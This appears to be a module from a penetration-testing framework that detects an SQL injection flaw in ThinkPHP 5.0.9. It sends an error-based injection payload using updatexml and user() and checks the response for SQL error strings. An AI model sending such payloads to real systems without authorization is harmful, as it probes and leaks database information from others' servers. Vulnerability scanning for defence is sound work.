#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""ThinkPHP 5."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'ThinkPHP 5.0.9 - Information Disclosure Detection',
        'description': 'ThinkPHP 5.0.9 includes verbose SQL error message that can reveal sensitive information including database credentials.',
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': ['web', 'scanner', 'vulnerability', 'thinkphp', 'vulhub', 'sqli', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/vulhub/vulhub/tree/0a0bc719f9a9ad5b27854e92bc4dfa17deea25b4/thinkphp/in-sqlinjection',
        ],
    }

    def run(self):
        r = self.http_request(method="GET", path='/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1', allow_redirects=False)
        if not r or r.status_code != 500:
            return False
        body = r.text or ""
        body_all = ('SQLSTATE', 'XPATH syntax error',)
        if (all(m in body for m in body_all)):
            self.set_info(
                severity='critical',
                reason="ThinkPHP 5.0.9 - Information Disclosure detected",
                path='/index.php?ids[0,updatexml(0,concat(0xa,user()),0)]=1',
            )
            return True
        return False

